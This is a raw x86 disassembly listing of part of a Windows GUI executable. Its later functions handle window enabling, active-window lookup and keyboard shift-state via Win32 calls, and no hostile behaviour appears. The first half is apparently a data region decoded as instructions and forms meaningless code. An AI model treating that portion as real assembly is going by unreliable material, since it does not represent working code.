scasb [ edi ]
inc ebx
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
outsb
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
or [ eax + 0x740043 ] dh
add bh bh
test [ ecx ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
dec ecx
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
push eax
0x45 0x8000
add [ eax ] al
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
imul ebp [ ebp + 0x6c ] 0x800454a
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
push esp
outsd
outsb
je r-xdata
add [ eax ] al
and eax 0x72440800
popad
add [ eax ] al
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
mov esp 0x9b0043ae
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
je r-xdata
jb r-xdata
inc esp
add [ eax + 0x2 ] ah
add bh bh
sbb al 0x9c
inc ebp
add al dh
0x45 0x8000
add [ eax ] al
add [ eax + 0x4f0e002f ] al
jb r-xdata
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
fdiv st5
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
jmp r-xdata
add eax [ eax ]
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add [ esi ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x10ff0001 ] ah
inc sp
js r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
add [ esi ] cl
dec edi
jbe r-xdata
adc [ eax ] al
dec esp
add [ eax ] al
call [ eax - 0x53ffbc0c ]
mov eax [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x4010e474
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add [ 0x35ff0002 ] dh
add al [ eax ]
push eax
0x45 0x8000
add [ eax ] eax
add [ eax ] al
xor al 0x0
jb r-xdata
jmp edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
outsb
je r-xdata
add al [ eax ]
0x2480044 0xff00
outsb
adc [ ecx + 0x45 ] dl
outsb
arpl [ eax - 0x7c ] bp
in eax dx
inc esp
add [ eax + eax ] bh
[ eax - 0x4 ]
inc eax
add [ eax - 0x53ffba62 ] ah
sahf
inc ebp
add al dh
0x45 0x8000
add [ eax ] eax
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
outsb
jne r-xdata
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
adc [ eax ] al
cmp al 0x9e
inc ebp
add [ eax - 0x62 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
outsd
push eax
inc ebp
add [ eax ] dh
add al [ eax ]
inc [ esi + ebx * 4 - 0x650fffbb ]
inc ebp
adc [ eax ] al
cdq
add [ eax ] al
inc [ eax ]
inc [ ebx ]
enter 0x43fd 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
push ebx
outsb
popad
jo r-xdata
movsb [ edi ] [ esi ]
mov es [ ebp ]
sub al 0x1d
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
adc [ eax ] al
dec eax
add [ eax ] al
[ esp + esi * 8 + 0x43 ]
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
add [ 0x74646957 ] al
push r-xdata
sub eax [ edx ]
add bh bh
pushfd
lahf
inc ebp
add al dh
0x45 0x8000
add [ eax ] al
jb r-xdata
add [ eax ] al
inc eax
add [ eax ] al
push eax
0x45 0x8000
add [ eax ] al
add [ eax + 0x4f0b003d ] al
je r-xdata
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ ebx ] ch
add al [ eax ]
[ edi + ebx * 4 - 0x650fffbb ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
dec edx
inc ebp
add [ edx + eax ] cl
add bh bh
cld
jpe r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
add bh bh
insb
hlt
add al dh
0x45 0x8000
add [ eax ] al
add [ eax + 0x560d000c ] al
jb r-xdata
jb r-xdata
push ecx
test [ ecx + eax * 2 ] cl
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
outsb
inc ebx
dec edi
shl ch 0x1
inc esp
add [ eax + 0x2 ] bl
add bh bh
inc eax
pushfd
inc ebp
add al dh
0x45 0x8000
add [ eax ] al
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
test [ gs : ecx + eax * 2 ] cl
pushad
mov dh 0x43
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
cmp [ eax ] eax
pop es
add [ eax ] al
dec esp
inc ecx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
push eax
0x45 0x8000
add [ eax ] al
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
jmp [ esi + ecx * 4 + 0x1d2c0045 ]
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
jb r-xdata
inc ebx
insb
outsd
jae r-xdata
push eax
0x45 0x8000
add [ eax ] al
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
in al 0x51
inc ebp
add [ eax + 0x4f090045 ] al
outsb
inc esp
jae r-xdata
js r-xdata
add al [ eax ]
push eax
0x45 0x8000
add [ eax ] al
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
push ecx
mov al 0xb2
inc ebx
jb r-xdata
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
push eax
push eax
outsd
jo r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
jbe r-xdata
jns r-xdata
dec edi
outsb
inc esp
jb r-xdata
mov ah 0xb3
0x45 0x8000
add [ eax ] al
add [ eax + 0x4f0c0046 ] al
mov al [ 0xfffffffff0ff0002 ]
jo r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
test [ ecx + eax * 2 ] cl
or [ edi + 0x6e ] ecx
jb r-xdata
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push cs
dec esp
inc ecx
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
add [ eax - 0x6700fffe ] bl
add al [ eax ]
push eax
0x45 0x8000
add [ eax ] al
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
dec esp
inc ecx
add al dl
add al [ eax ]
call eax
add bh bh
imul esi [ ebp + 0x49 ] 0x846f666e
dec esp
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
push eax
inc ebx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
imul esi [ esi + 0x61 ] 0xb3b46574
add al ch
add [ eax ] al
mov dl 0x43
outsb
outsw
test [ ecx + eax * 2 ] cl
mov al 0x2
add bh bh
mov al 0x2
add bh bh
jo r-xdata
0x45 0x8000
add [ eax ] al
add [ eax + 0x4f06004d ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x64 ] bp
mov ch 0x43
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov bl 0x43
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
inc esp
outsd
arpl [ ebx + 0x4f ] bp
mov ah 0x43
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
outsb
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
add [ ecx ] cl
dec edi
mov dl 0x43
add al dh
add [ eax ] al
push eax
add [ eax ] al
push eax
0x45 0x8000
add [ eax ] al
add [ eax + 0x4f0a004a ] al
outsb
inc esp
jb r-xdata
outsb
dec eax
imul esp [ ebp + 0x64 ] 0xa8004552
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
dec ebp
add [ esi ] al
dec edi
sub_456375
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x64dc0045 ] ah
inc ebp
add al bh
add al [ eax ]
add al al
push edx
inc ebp
add [ eax ] cl
fadd [ ecx ]
in al dx
add [ ebp ] r-xdata
inc esp
xor eax 0xa80c0040
inc ebp
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
or [ ebp + eax * 2 + 0x446fa400 ] al
add [ eax - 0x77 ] bh
inc ebp
add [ ebx + edi * 2 ] dl
inc ecx
add [ esi + ecx * 8 + 0x45 ] ch
add [ esi + eax * 4 ] al
inc ebp
add [ eax ] dl
xchg [ ebp ] eax
cwde
cli
inc ebx
add [ eax ] ah
fadd [ ecx ]
mov [ edi - 0x2affffbb ] cl
inc ecx
add [ eax ] ch

sub_456412
inc ebx
add [ esp + edi * 8 ] cl
inc ebx
add [ eax - 0x71 ] dl
inc ebp
add [ esi + ecx * 4 ] bl
inc ebp
add [ ebp + edi * 8 + 0x43 ] al
add al cl
pop [ ebp ]
in al dx
pop ds
inc esp
add [ ebx ] al
inc esp
add al al
arpl [ eax + eax - 0x7c ] ax
pop esi
inc esp
add [ ebx + 0x7f600044 ] ah
inc ebp
add [ esi + edx * 4 + 0x45 ] ch
add [ eax ] bh
cmp [ eax + eax + 0x30 ] eax
mov [ 0xffffffffa6900045 ] eax
inc ebp
add [ ebp + 0x45 ] cl
add al dl
cmp [ eax + eax - 0x2c ] eax
cmp [ eax + eax - 0x38 ] eax
cmpsd [ esi ] [ edi ]
inc ebp
add [ eax + edi ] dh
inc esp
add ah ah
inc esp
add [ esi + ebp * 4 + 0x76740045 ] bh
inc esp
add [ eax ] ch
popad
inc esp
add al dl
retn
sub_4564ed
inc ebp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ esi + 0x35400040 ] bh
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
xor [ esi + 0x45 ] ah
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
loopne r-xdata
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
in al dx
rol [ ebp ] 0x1
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
pop es
push esp
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ eax + 0x35 ] al
mov al 0x63
inc ebp
add [ eax + 0xe004555 ] ah
add [ 0x6d726f46 ] al
jae r-xdata
pop esp
inc ebp
add [ eax ] bh
pop edi
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
push esp
adc [ eax ] al
cmp al 0x9e
inc ebp
add [ eax - 0x62 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx + 0x40 ] dl
add [ esi + ebx * 4 ] bh
inc eax
add [ eax + eax ] bh
add [ eax ] al
xchg [ fs : edx ] eax
dec esp
add [ eax ] al
add ah ah
adc [ eax ] al
push eax
add [ eax ] al
add ah ah
adc [ eax ] al
push esp
add [ eax ] al
add ah ah
adc [ eax ] al
mov [ eax ] es
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
shl dl 0x1
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add ah ah
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
in al 0x10
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
inc eax
add [ eax ] cl
push esp
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0xe000408d
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc bp
add [ eax ] dh
inc bp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
inc bp
add [ eax + 0x3c000000 ] ah
pop esi
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x2cbbffc0 ] bl
inc ebp
add al bh
jpo r-xdata
xor al [ eax ]
fdiv [ edx ]
outsb
arpl [ eax - 0x70 ] bp
mov [ ebp + 0x45 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004565 ] cl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
xor al 0x67
inc ebp
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
rol [ ecx ] 0x1
inc esp
xor eax 0x35380040
inc eax
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
mov esp 0xf80045e4
jpo r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
nop
mov eax 0x4566
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
inc bp
add [ edi ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
inc ebp
add [ eax + 0x1 ] al
add [ eax ] al
cmp al 0x5e
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x1b43ffc0 ] bl
inc ebp
add al bh
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
mov eax 0x38004566
pop edi
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ ecx + rw-data ] ah
retn
sub_456764
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_4567b0
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45feb8
mov eax [ rw-data ]
call sub_41d338
mov eax [ rw-data ]
call sub_41d2e0
retn
push 0x0
push eax
call ShowOwnedPopups
sub_4567e8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_40276c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_456838
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_4568db
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4568a4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_4567e8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4568e2
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_4568ec
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_40278c
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_456924
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_456988
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_456924
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_4569e4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_456a04
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_4569e4
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_456a30
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_45d498
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45d908
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407f80
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45d484
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45d8f4
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407f80
test eax eax
je r-xdata
sub_456ab8
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_456b0c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_456b48
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_456b94
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_456bf2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_454748
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404220
mov eax [ ebp - 0x8 ]
pop edx
call sub_407f80
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456bf9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
sub_456c04
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_456c2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_456c9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_456c04
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456ca4
lea eax [ ebp - 0xc ]
call sub_404038
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
sub_456cac
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_456d3c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_417b14
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_457604
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4575e4
mov edx [ edi + 0xc ]
mov eax ebx
call sub_457494
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_456d8c
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_456f44
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_440324
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_457494
xor edx edx
mov eax ebx
call sub_457494
jmp r-xdata
sub_456dc4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_427ae4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_456e30
